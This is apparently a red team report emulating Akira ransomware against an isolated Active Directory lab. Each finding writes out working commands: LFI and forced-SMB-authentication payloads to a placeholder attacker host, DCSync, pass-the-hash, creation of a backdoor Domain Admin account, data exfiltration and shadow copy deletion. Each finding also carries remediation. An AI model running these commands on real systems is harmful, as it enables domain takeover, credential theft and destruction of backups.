# Akira Ransomware Threat Actor Emulation
## Active Directory Attack Simulation - corp.local

**Assessment Type:** Threat Intelligence-Led Red Team Emulation  
**Target Environment:** corp.local (Windows Server 2025)  
**Threat Actor:** Akira Ransomware Group (G1024)  
**Primary Reference:** CISA Advisory AA24-109A (Updated November 2025)  
**Date:** March 2026  
**Author:** Mytk0  

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Threat Actor Profile](#threat-actor-profile)
3. [Environment Overview](#environment-overview)
4. [Attack Chain Overview](#attack-chain-overview)
5. [Findings](#findings)
   - [FIND-01: Web Application Local File Inclusion](#find-01-web-application-local-file-inclusion)
   - [FIND-02: Forced SMB Authentication via LFI - NTLMv2 Hash Capture](#find-02-forced-smb-authentication-via-lfi--ntlmv2-hash-capture)
   - [FIND-03: Sensitive Credentials Stored in Plaintext on Network Share](#find-03-sensitive-credentials-stored-in-plaintext-on-network-share)
   - [FIND-04: ACL Misconfiguration - ForceChangePassword on Domain User](#find-04-acl-misconfiguration--forcechangepassword-on-domain-user)
   - [FIND-05: Backup Operators Group Abuse - Registry Hive Extraction](#find-05-backup-operators-group-abuse--registry-hive-extraction)
   - [FIND-06: Pass-the-Hash - Local Administrator](#find-06-pass-the-hash--local-administrator)
   - [FIND-07: Persistence via Backdoor Domain Admin Account](#find-07-persistence-via-backdoor-domain-admin-account)
   - [FIND-08: DCSync - Full Domain Credential Dump](#find-08-dcsync--full-domain-credential-dump)
   - [FIND-09: Sensitive Data Exfiltration via SMB](#find-09-sensitive-data-exfiltration-via-smb)
   - [FIND-10: Volume Shadow Copy Deletion](#find-10-volume-shadow-copy-deletion)
6. [MITRE ATT&CK Summary](#mitre-attck-summary)
7. [Remediation Summary](#remediation-summary)
8. [Appendix A - Tools Used](#appendix-a--tools-used)
9. [Appendix B - Indicators of Compromise](#appendix-b--indicators-of-compromise)

---

## Executive Summary

This report documents a threat intelligence-led red team emulation of the **Akira ransomware group (G1024)** against an isolated Active Directory environment (`corp.local`). The emulation was conducted following the Threat Intelligence-Based Ethical Red Teaming (TIBER) methodology, using Akira's documented tactics, techniques, and procedures (TTPs) as defined in CISA Advisory AA24-109A.

Starting from an unauthenticated position and simulating external web application access, the assessment achieved full domain compromise through a realistic, multi-stage attack chain. The following critical outcomes were demonstrated:

- **Full domain credential dump** via DCSync using a backdoor Domain Admin account
- **Sensitive HR data exfiltrated** via SMB, simulating Akira's double extortion model
- **Volume Shadow Copies deleted**, eliminating the organisation's ability to recover without offline backups
- **Persistent backdoor account created** (`itadm`) - a known Akira persistence indicator per CISA AA24-109A

The attack succeeded due to a combination of misconfigured ACLs, credentials stored in plaintext on accessible network shares, and excessive group privileges assigned to service accounts. None of the attack phases triggered security alerts, demonstrating a significant gap in detection capability.

**Risk Rating: CRITICAL**

---

## Threat Actor Profile

| Attribute | Detail |
|---|---|
| Group Name | Akira |
| MITRE ID | G1024 |
| First Observed | March 2023 |
| Targets | SMB, Critical Infrastructure, Healthcare, Finance |
| Ransomware Variants | Akira (C++), Akira_v2 (ESXi/Rust) |
| Financial Impact | $244.17M USD (as of September 2025) |
| Primary Reference | CISA AA24-109A, IC3 CSA 251113 |

Akira is a ransomware-as-a-service (RaaS) group that employs a double extortion model - exfiltrating sensitive data prior to encryption and threatening public release if ransom is not paid. The group is known for targeting VPN appliances, abusing valid credentials, and creating persistent backdoor accounts named `itadm` within compromised environments.

---

## Environment Overview

| Host | IP | Role | OS |
|---|---|---|---|
| DC01 | 10.10.10.10 | Domain Controller | Windows Server 2025 |
| CLIENT01 | 10.10.10.20 | Workstation | Windows 11 |
| Attacker | 10.10.10.50 | Exegol (Linux) | Kali-based |

**Domain:** corp.local  
**Forest Functional Level:** Windows Server 2025  
**SMB Signing:** Enforced  
**LDAP Signing:** Enforced  

---

## Attack Chain Overview

```
[External Web App]
       |
       | LFI → Forced SMB Auth
       v
[NTLMv2 Hash Captured] → Cracked → <service_account1>:<REDACTED>
       |
       | Password reuse / credential pivot
       v
[<service_account2>:<REDACTED>] ← Validated via NetExec
       |
       | SMB Share Enumeration → spider_plus
       v
[CorpShare READ] → IT-Notes.txt → helpdesk:<REDACTED>
                               → <service_account3>:<REDACTED>
       |
       | ACL Enumeration → bloodyAD
       v
[helpdesk ForceChangePassword → j.smith]
       |
       | Password Reset → j.smith:<REDACTED>
       v
[Credential Discovery → IT-Support-Creds.xlsx]
       |
       | <service_account3> → Backup Operators
       v
[WinRM Shell as <service_account3>] → reg save SAM + SYSTEM
       |
       | secretsdump LOCAL
       v
[Administrator NTLM Hash] → Pass-the-Hash
       |
       | evil-winrm as Administrator
       v
[Persistence] → net user itadm /add → Domain Admins
       |
       | DCSync
       v
[ALL DOMAIN HASHES DUMPED]
       |
       |--- HR_Salaries.xlsx exfiltrated (Double Extortion)
       |--- vssadmin delete shadows /all  (T1490)
       v
[DOMAIN FULLY COMPROMISED]
```

---

## Findings

---

### FIND-01: Web Application Local File Inclusion

| Attribute | Detail |
|---|---|
| **Severity** | High |
| **CVSS v3.1** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N - Score: 7.5 |
| **MITRE ATT&CK** | T1190 - Exploit Public-Facing Application |
| **Akira TTP** | Initial access via external web application (CISA AA24-109A) |

#### Description

The web application hosted at `corp.local` was found to be vulnerable to Local File Inclusion (LFI) via the `view` GET parameter. The application attempted to block relative path traversal (`../`) but failed to sanitise absolute paths, allowing an attacker to read arbitrary files from the underlying Windows filesystem.

#### Technical Detail

Attempts to use relative traversal were blocked:
```
GET /index.php?view=../../../windows/system32/drivers/etc/hosts
Response: "Suspicious Activity Blocked"
```

Absolute path bypass was successful:
```
GET /index.php?view=c:/windows/system32/drivers/etc/hosts
Response: [file contents returned]
```

#### Impact

An unauthenticated attacker can read arbitrary files from the server filesystem including configuration files, credentials, and sensitive application data. This vulnerability was subsequently chained with forced SMB authentication to capture NTLMv2 credential hashes.

#### Remediation

- Implement a strict allowlist of permitted file paths rather than a blocklist of traversal patterns
- Disable PHP's ability to open remote or absolute file paths (`allow_url_include = Off`, `open_basedir` restriction)
- Conduct a full code review of all parameters that accept file paths

---

### FIND-02: Forced SMB Authentication via LFI - NTLMv2 Hash Capture

| Attribute | Detail |
|---|---|
| **Severity** | High |
| **CVSS v3.1** | AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N - Score: 5.9 |
| **MITRE ATT&CK** | T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning, T1110.002 - Password Cracking |
| **Akira TTP** | Credential capture for initial domain access (CISA AA24-109A) |

#### Description

The LFI vulnerability was chained with a UNC path injection to force the web server to initiate an outbound SMB connection to an attacker-controlled host. The Windows server automatically attempted NTLM authentication when processing the UNC path, exposing the service account's NTLMv2 hash to an attacker running Responder.

#### Technical Detail

```
# Attacker - start Responder
responder -I eth0

# Trigger forced authentication via LFI
GET /index.php?view=//xx.xx.xx.xx/test

# Responder captured:
[SMB] NTLMv2 Hash: <service_account1>::corp:<REDACTED>

# Offline crack with hashcat
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
Result: <service_account1>:<REDACTED>
```

#### Impact

Recovery of a valid domain service account credential provided an authenticated foothold into the corporate Active Directory environment. This was the pivot point for all subsequent attack phases.

#### Remediation

- Block outbound SMB (TCP 445) at the perimeter firewall
- Disable NTLM authentication where possible, enforce Kerberos
- Enforce strong, unique passwords on all service accounts (minimum 25 characters, randomly generated)
- Use Managed Service Accounts (MSA/gMSA) to eliminate the risk of crackable service account passwords

---

### FIND-03: Sensitive Credentials Stored in Plaintext on Network Share

| Attribute | Detail |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1** | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H - Score: 8.8 |
| **MITRE ATT&CK** | T1135 - Network Share Discovery, T1552.001 - Credentials in Files |
| **Akira TTP** | Credential harvesting from internal file shares (CISA AA24-109A) |

#### Description

The `CorpShare` network share was accessible to all domain users with READ permissions. A systematic spider of the share using `spider_plus` revealed multiple files containing sensitive information including plaintext credentials for domain accounts.

#### Technical Detail

```bash
# Share enumeration
netexec smb 10.10.10.10 -u <service_account2> -p '<REDACTED>' --shares
# Result: CorpShare READ

# Spider share contents
netexec smb 10.10.10.10 -u <service_account2> -p '<REDACTED>' -M spider_plus -o DOWNLOAD_FLAG=True
# Downloaded: IT-Notes.txt, backup-config.txt, IT-Support-Creds.xlsx, HR_Salaries.xlsx

# IT-Notes.txt contents:
<service_account2> password rotation scheduled Q4
helpdesk temp pass: <REDACTED> (reset after onboarding)

# backup-config.txt contents:
Backup account: <service_account3>

# IT-Support-Creds.xlsx — password protected, cracked offline
# Contents: <service_account3>:<REDACTED>, it.admin:<REDACTED>
```

#### Impact

Plaintext credentials for the `helpdesk` and `<service_account3>` accounts were recovered directly from accessible share files. These credentials were subsequently used to escalate privileges to Domain Admin. The `HR_Salaries.xlsx` file contained sensitive employee salary data which was exfiltrated as part of the double extortion simulation.

#### Remediation

- Immediately audit all network shares for files containing credentials or sensitive data
- Implement least-privilege access controls — domain users should not have READ access to IT administrative shares
- Enforce a credential management policy prohibiting storage of passwords in documents or text files
- Deploy a Privileged Access Management (PAM) solution for service account credential storage
- Enable file access auditing on sensitive shares (Windows Security Event ID 4663)

---

### FIND-04: ACL Misconfiguration - ForceChangePassword on Domain User

| Attribute | Detail |
|---|---|
| **Severity** | High |
| **CVSS v3.1** | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N - Score: 8.1 |
| **MITRE ATT&CK** | T1484 - Domain Policy Modification, T1078 - Valid Accounts |
| **Akira TTP** | Lateral movement via credential abuse (CISA AA24-109A) |

#### Description

The `helpdesk` account was found to hold the `ForceChangePassword` extended right over the `j.smith` user object. This non-default ACL misconfiguration allowed the helpdesk account to reset j.smith's password without knowing the current password, effectively taking over the account.

#### Technical Detail

The ACE was identified in the raw `nTSecurityDescriptor` attribute of the `j.smith` object. The ForceChangePassword extended right GUID `00299570-246d-11d0-a768-00aa006e0529` was present with the helpdesk SID as the trustee:

```
(OA;;CR;00299570-246d-11d0-a768-00aa006e0529;;S-1-5-21-...-1102)
```

Exploitation using bloodyAD:
```bash
# Confirm helpdesk credentials
netexec smb 10.10.10.10 -u helpdesk -p '<REDACTED>' -d corp.local
# [+] corp.local\helpdesk:<REDACTED>

# Force password reset on j.smith
bloodyAD --host 10.10.10.10 -d corp.local -u helpdesk -p '<REDACTED>' set password j.smith '<REDACTED>'
# [+] Password changed successfully!

# Validate takeover
netexec smb 10.10.10.10 -u j.smith -p '<REDACTED>' -d corp.local
# [+] corp.local\j.smith:<REDACTED>
```

#### Impact

Account takeover of `j.smith` without requiring knowledge of the existing password. In a real engagement, this would also lock the legitimate user out if combined with further password changes, causing operational disruption.

#### Remediation

- Audit all non-default ACEs across the domain using BloodHound or `Get-ADUser -Filter * | Get-ACL`
- Remove the `ForceChangePassword` right from `helpdesk` over `j.smith`
- Implement a quarterly ACL review process for all privileged object permissions
- Follow the principle of least privilege - helpdesk accounts should only have password reset rights delegated through controlled processes, not directly on user objects
- Consider deploying Microsoft's [Active Directory Security Best Practices](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)

---

### FIND-05: Backup Operators Group Abuse - Registry Hive Extraction

| Attribute | Detail |
|---|---|
| **Severity** | High |
| **CVSS v3.1** | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N — Score: 6.5 |
| **MITRE ATT&CK** | T1003.002 - OS Credential Dumping: Security Account Manager, T1078.002 - Valid Accounts: Domain Accounts |
| **Akira TTP** | Credential access via legitimate backup tooling (CISA AA24-109A) |

#### Description

The `<service_account3>` service account was a member of the built-in `Backup Operators` group. This group grants the `SeBackupPrivilege` and `SeRestorePrivilege` privileges, which allow members to read any file on the system regardless of DACL restrictions, including sensitive registry hives. Combined with WinRM access, this allowed remote registry extraction.

#### Technical Detail

```bash
# Confirm group membership
bloodyAD --host 10.10.10.10 -d corp.local -u <service_account3> -p '<REDACTED>' get membership <service_account3>
# Result: Backup Operators (S-1-5-32-551) confirmed

# Confirm WinRM access
netexec winrm 10.10.10.10 -u <service_account3> -p '<REDACTED>' -d corp.local
# [+] corp.local\<service_account3>:<REDACTED> (admin)

# Obtain shell and dump registry hives
evil-winrm -i 10.10.10.10 -u <service_account3> -p '<REDACTED>'

*Evil-WinRM* PS> reg save HKLM\SAM C:\Windows\Temp\sam.save
*Evil-WinRM* PS> reg save HKLM\SYSTEM C:\Windows\Temp\system.save

# Download and extract locally
impacket-secretsdump -sam sam.save -system system.save LOCAL

# Result:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
```

#### Impact

Recovery of the local Administrator NTLM hash from the domain controller, enabling Pass-the-Hash attacks and full administrative access to the DC without requiring the plaintext password.

#### Remediation

- Remove `<service_account3>` from the Backup Operators group — service accounts should not hold this privilege
- Use dedicated backup solutions with narrowly scoped permissions rather than relying on the Backup Operators built-in group
- Restrict WinRM access to dedicated PAM jump hosts only
- Monitor for Event ID 4672 (Special Logon) and Event ID 4673 (Privileged Service Called) for Backup Operators group members
- Implement Just-In-Time (JIT) access for privileged groups

---

### FIND-06: Pass-the-Hash - Local Administrator

| Attribute | Detail |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1** | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H - Score: 8.8 |
| **MITRE ATT&CK** | T1550.002 - Pass the Hash |
| **Akira TTP** | Lateral movement using harvested credentials (CISA AA24-109A) |

#### Description

The local Administrator NTLM hash recovered from the registry hive dump was used to authenticate directly to the domain controller without requiring the plaintext password. As the local Administrator account shared the same password hash across the environment, this provided immediate administrative access to DC01.

#### Technical Detail

```bash
# Pass-the-Hash authentication
netexec smb 10.10.10.10 -u Administrator -H '<REDACTED>' -d corp.local
# [+] corp.local\Administrator:<REDACTED> (admin)

# Obtain interactive shell
evil-winrm -i 10.10.10.10 -u Administrator -H '<REDACTED>'
```

#### Impact

Full administrative shell on the domain controller as the built-in Administrator account. All subsequent actions - persistence, DCSync, data exfiltration, and VSS deletion - were performed from this access level.

#### Remediation

- Enable and enforce **Local Administrator Password Solution (LAPS)** across all domain-joined machines to ensure unique local Administrator passwords per host
- Disable the built-in Administrator account where possible and use named administrative accounts
- Enable **Protected Users** security group for privileged accounts to prevent NTLM authentication
- Deploy **Credential Guard** on Windows 10/Server 2016+ to protect NTLM hashes in memory

---

### FIND-07: Persistence via Backdoor Domain Admin Account

| Attribute | Detail |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1** | AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H - Score: 7.2 |
| **MITRE ATT&CK** | T1136.002 — Create Account: Domain Account |
| **Akira TTP** | Persistence via `itadm` account creation - explicitly documented in CISA AA24-109A |

#### Description

Following domain administrator access, a backdoor account named `itadm` was created and added to the Domain Admins group. This is a documented Akira ransomware persistence technique explicitly named in CISA Advisory AA24-109A - Akira operators consistently create accounts named `itadm` to maintain persistent access independent of any remediated initial access vector.

#### Technical Detail

```powershell
# Create backdoor account
net user itadm '<REDACTED>' /add /domain
# The command completed successfully.

# Add to Domain Admins
net group "Domain Admins" itadm /add /domain
# The command completed successfully.

# Verify
net user itadm /domain
# Global Group memberships: *Domain Admins  *Domain Users
```

#### Impact

A persistent Domain Admin backdoor account provides continued access to the environment even if the initial compromise vector is discovered and remediated. In a real Akira incident, this account would be used to re-enter the environment after detection or to maintain access during the ransomware deployment phase.

#### Remediation

- **Immediately audit Domain Admins group membership** and investigate any unrecognised accounts, particularly accounts named `itadm`
- Implement alerting on Event ID 4720 (User Account Created) and Event ID 4728 (Member Added to Security-Enabled Global Group) for privileged groups
- Deploy a SIEM rule to alert on any new account additions to Domain Admins, Enterprise Admins, or Schema Admins
- Enforce a naming convention policy for administrative accounts with approval workflow
- Conduct regular (weekly) privileged group membership reviews

---

### FIND-08: DCSync — Full Domain Credential Dump

| Attribute | Detail |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1** | AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H - Score: 9.0 |
| **MITRE ATT&CK** | T1003.006 — OS Credential Dumping: DCSync |
| **Akira TTP** | Credential access for domain-wide impact (CISA AA24-109A) |

#### Description

Using the backdoor `itadm` Domain Admin account, a DCSync attack was performed to replicate all credential material from the domain controller. DCSync abuses legitimate Active Directory replication functionality (MS-DRSR protocol) to request password hashes for any domain account without requiring local access to the NTDS.DIT file.

#### Technical Detail

```bash
impacket-secretsdump corp.local/itadm:'<REDACTED>'@10.10.10.10 -just-dc

# Dumped credentials (partial):
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
it.admin:1101:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
helpdesk:1102:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
j.smith:1103:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
hr.user:1104:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
<service_account2>:1105:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
<service_account3>:1111:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
```

#### Impact

Recovery of all domain credential hashes including the `krbtgt` hash, which enables Golden Ticket attacks providing indefinite, persistent Kerberos authentication as any user in the domain. All user and machine account hashes were recovered, representing complete domain compromise. In a real Akira engagement, these credentials would be used to authenticate to all domain-joined systems during the ransomware deployment phase.

#### Remediation

- **Perform a double krbtgt password reset** immediately following any suspected domain compromise (reset once, wait 10 hours for replication, reset again)
- Force password resets for all domain accounts
- Monitor for Event ID 4662 with `Replicating Directory Changes All` access rights - this is the DCSync detection signature
- Restrict DS-Replication-Get-Changes-All permissions to only Domain Controllers
- Deploy Microsoft Defender for Identity (MDI) which has native DCSync detection

---

### FIND-09: Sensitive Data Exfiltration via SMB

| Attribute | Detail |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1** | AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N — Score: 4.9 |
| **MITRE ATT&CK** | T1039 — Data from Network Shared Drive, T1048 - Exfiltration Over Alternative Protocol |
| **Akira TTP** | Data exfiltration prior to encryption - double extortion model (CISA AA24-109A) |

#### Description

Prior to simulating ransomware deployment, sensitive HR data was staged and exfiltrated from the CorpShare network share. This simulates Akira's documented double extortion model — the group exfiltrates sensitive data before encrypting and threatens public release on their leak site if ransom is not paid.

#### Technical Detail

```bash
# Exfiltrate HR salary data using Domain Admin credentials
smbclient //10.10.10.10/CorpShare -U 'itadm%<REDACTED>' \
  -c "get HR_Salaries.xlsx /tmp/HR_Salaries.xlsx"

# Result: getting file \HR_Salaries.xlsx of size 26
```

The file `HR_Salaries.xlsx` containing employee salary information was successfully retrieved. In a real Akira engagement, this data would be uploaded to Akira's Tor-based leak site (`akiralkzxzq2dsn.onion`) as leverage.

#### Impact

Exfiltration of sensitive employee HR data constitutes a data breach with regulatory implications under GDPR. Akira's public leak site creates reputational damage regardless of whether the ransom is paid. The organisation faces potential fines, employee notification obligations, and legal liability.

#### Remediation

- Implement Data Loss Prevention (DLP) controls to detect and block bulk SMB file transfers
- Restrict access to HR data to only HR department accounts — domain users and service accounts should have no access to HR files
- Encrypt sensitive files at rest so that exfiltration yields unusable ciphertext
- Monitor for large volume SMB read operations (Windows Event ID 5145)
- Implement network segmentation to prevent lateral access from service accounts to sensitive file shares

---

### FIND-10: Volume Shadow Copy Deletion

| Attribute | Detail |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1** | AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H - Score: 4.9 |
| **MITRE ATT&CK** | T1490 - Inhibit System Recovery |
| **Akira TTP** | Shadow copy deletion prior to ransomware deployment (CISA AA24-109A) |

#### Description

Volume Shadow Copies (VSS) were immediately deleted using `vssadmin`, simulating Akira's pre-encryption routine. Akira consistently deletes shadow copies to prevent victims from recovering encrypted files without paying the ransom.

#### Technical Detail

```powershell
# Delete all shadow copies - Akira pre-encryption TTP
vssadmin delete shadows /all /quiet
```

Note: `wmic shadowcopy delete` — the secondary Akira VSS deletion command - is not available on Windows Server 2025 as WMIC has been deprecated. The `vssadmin` method achieves the same result.

#### Impact

Deletion of all Volume Shadow Copies eliminates the primary on-host recovery mechanism. Without VSS snapshots, recovery from ransomware encryption requires restoration from offline/offsite backups. If no such backups exist or are also compromised, the organisation faces complete data loss.

#### Remediation

- Implement **offline and immutable backups** stored in a network segment inaccessible from domain-joined machines
- Follow the **3-2-1 backup rule**: 3 copies, 2 different media types, 1 offsite
- Restrict `vssadmin` execution via AppLocker or WDAC policies
- Monitor for Event ID 8222 (Shadow Copy Created) followed immediately by deletion events
- Consider Azure Backup or similar cloud backup solutions with immutable storage policies

---

## MITRE ATT&CK Summary

| Technique ID | Technique Name | Finding |
|---|---|---|
| T1190 | Exploit Public-Facing Application | FIND-01 |
| T1557.001 | NTLM Hash Capture via Forced Authentication | FIND-02 |
| T1110.002 | Password Cracking | FIND-02 |
| T1135 | Network Share Discovery | FIND-03 |
| T1552.001 | Credentials in Files | FIND-03 |
| T1110.003 | Password Spraying | Reconnaissance |
| T1087.002 | Domain Account Enumeration | Reconnaissance |
| T1484 | ACL Misconfiguration Abuse | FIND-04 |
| T1078 | Valid Accounts | FIND-04, FIND-06 |
| T1003.002 | SAM/Registry Credential Dumping | FIND-05 |
| T1550.002 | Pass the Hash | FIND-06 |
| T1136.002 | Create Domain Account (itadm) | FIND-07 |
| T1003.006 | DCSync | FIND-08 |
| T1039 | Data from Network Shared Drive | FIND-09 |
| T1048 | Exfiltration Over SMB | FIND-09 |
| T1490 | Inhibit System Recovery (VSS Deletion) | FIND-10 |

---

## Remediation Summary

| Priority | Finding | Action | Owner |
|---|---|---|---|
| P1 — Immediate | FIND-03 | Remove credentials from CorpShare, audit all shares | IT Security |
| P1 — Immediate | FIND-07 | Audit Domain Admins group, remove unknown accounts | AD Team |
| P1 — Immediate | FIND-08 | Reset krbtgt password twice, force all user password resets | AD Team |
| P1 — Immediate | FIND-06 | Deploy LAPS across all domain-joined hosts | IT Operations |
| P2 — Short Term | FIND-04 | Audit and remediate non-default ACEs domain-wide | AD Team |
| P2 — Short Term | FIND-05 | Remove <service_account3> from Backup Operators, restrict WinRM | IT Security |
| P2 — Short Term | FIND-09 | Restrict HR share access, implement DLP | IT Security |
| P2 — Short Term | FIND-10 | Implement immutable offline backups | IT Operations |
| P3 — Medium Term | FIND-01 | Remediate LFI vulnerability, implement WAF | Development |
| P3 — Medium Term | FIND-02 | Block outbound SMB at perimeter, enforce Kerberos | Network Team |

---

## Appendix A — Tools Used

| Tool | Purpose | Phase |
|---|---|---|
| ffuf | Subdomain enumeration | Reconnaissance |
| Responder | NTLMv2 hash capture | Initial Access |
| hashcat | Offline password cracking | Credential Access |
| NetExec (nxc) | SMB/LDAP/WinRM authentication and enumeration | All phases |
| impacket-GetUserSPNs | Kerberoasting (blocked — AES-only environment) | Credential Access |
| spider_plus | SMB share spidering and file download | Discovery |
| bloodyAD | ACL enumeration and exploitation | Privilege Escalation |
| impacket-reg | Remote registry access | Credential Access |
| impacket-secretsdump | Credential extraction (SAM/SYSTEM/DCSync) | Credential Access |
| evil-winrm | WinRM shell access | Lateral Movement |
| smbclient | SMB file operations | Exfiltration |
| vssadmin | Volume Shadow Copy deletion | Impact |

**Note on Kerberoasting:** The target environment runs Windows Server 2025 which enforces AES-only Kerberos encryption by default. RC4-based Kerberoasting was not possible without downgrading the domain encryption policy. This represents a security improvement over legacy environments and is noted as a positive security control. AES Kerberoasting remains theoretically possible but significantly increases offline cracking difficulty.

**Note on BloodHound:** Remote BloodHound collection via bloodhound-python was not possible due to enforced LDAP signing combined with LDAPS certificate trust issues on the Python ldap3 library. ACL paths were enumerated manually using bloodyAD and raw LDAP attribute queries. In a real engagement, SharpHound executed locally on a compromised host would provide full BloodHound graph data.

---

## Appendix B — Indicators of Compromise

| IOC | Type | Description |
|---|---|---|
| `itadm` | Account Name | Akira persistence account — check Domain Admins immediately |
| `<REDACTED>` | Credential | Recovered <service_account1> password |
| `vssadmin delete shadows /all /quiet` | Command | Akira VSS deletion command |
| `net user itadm * /add /domain` | Command | Akira persistence account creation |
| `C:\Windows\Temp\sam.save` | File Path | Registry hive staging location |
| `C:\Windows\Temp\system.save` | File Path | Registry hive staging location |
| Event ID 4720 | Windows Event | New user account created |
| Event ID 4728 | Windows Event | Member added to Domain Admins |
| Event ID 4662 | Windows Event | DCSync — Replicating Directory Changes All |
| Event ID 8222 | Windows Event | Volume Shadow Copy created (watch for immediate deletion) |

---

*This report was produced as part of a threat intelligence-led red team emulation exercise following the TIBER methodology. All activity was conducted in an isolated lab environment. No production systems were affected.*

*References: CISA Advisory AA24-109A, MITRE ATT&CK G1024, IC3 CSA 251113*
